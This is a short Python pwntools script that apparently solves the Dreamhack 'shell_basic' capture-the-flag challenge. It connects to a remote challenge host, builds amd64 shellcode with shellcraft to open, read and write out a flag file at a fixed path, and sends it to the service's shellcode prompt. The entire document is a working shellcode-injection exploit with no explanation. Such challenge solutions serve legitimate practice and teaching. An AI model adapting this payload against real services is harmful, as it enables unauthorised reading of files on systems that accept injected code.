from pwn import *

context.arch = "amd64"

port = 10411
rem = remote("host1.dreamhack.games", port)

payload = asm(shellcraft.open("/home/shell_basic/flag_name_is_loooooong"))
payload += asm("mov rdi, rax")
payload += asm("mov rsi, rsp")
payload += asm("sub rsi, 0x30")
payload += asm(shellcraft.read("rdi", "rsi", 0x30))
payload += asm(shellcraft.write(1, "rsi", 0x30))

rem.sendlineafter(b"shellcode: ", payload)
print(rem.recvn(0x30))